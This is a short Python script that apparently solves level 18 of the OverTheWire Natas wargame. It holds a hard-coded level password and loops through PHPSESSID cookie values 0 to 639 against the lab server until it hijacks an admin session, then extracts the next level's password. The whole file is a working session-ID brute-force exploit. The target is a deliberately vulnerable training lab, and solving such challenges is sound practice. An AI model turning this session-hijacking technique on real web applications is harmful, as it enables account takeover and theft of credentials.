import requests
import re


username ='natas18'
password ='xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'

url = 'http://%s.natas.labs.overthewire.org/' %username

session = requests.Session()
for i in range(0,640):
    cookies = {"PHPSESSID":str(i)}
    responce = session.post(url,cookies=cookies ,data={"username":"test","password":"pass"},auth=(username,password))
    content = responce.text
    reguler = re.findall("You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.",content)
    print(i)
    if reguler:
        print(reguler)
    else:
        print("password for natas19 is =",re.findall("Password: (.*)</pre>",content))
        break